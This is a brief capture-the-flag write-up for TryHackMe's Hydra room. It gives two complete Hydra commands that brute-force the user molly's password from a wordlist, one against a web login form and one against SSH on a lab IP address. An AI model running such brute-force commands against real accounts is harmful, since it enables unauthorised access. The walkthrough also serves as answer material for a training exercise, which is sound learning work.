# Hydra | DarkStar7471

**Room Link:** [https://tryhackme.com/room/hydra](https://tryhackme.com/room/hydra)

Add steps later

**Use Hydra to bruteforce molly's web password. What is flag 1?**

Web hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^\&password=^PASS^:F=incorrect" -V

**Use Hydra to bruteforce molly's SSH password. What is flag 2?**

SSH hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 -t 4 ssh -V
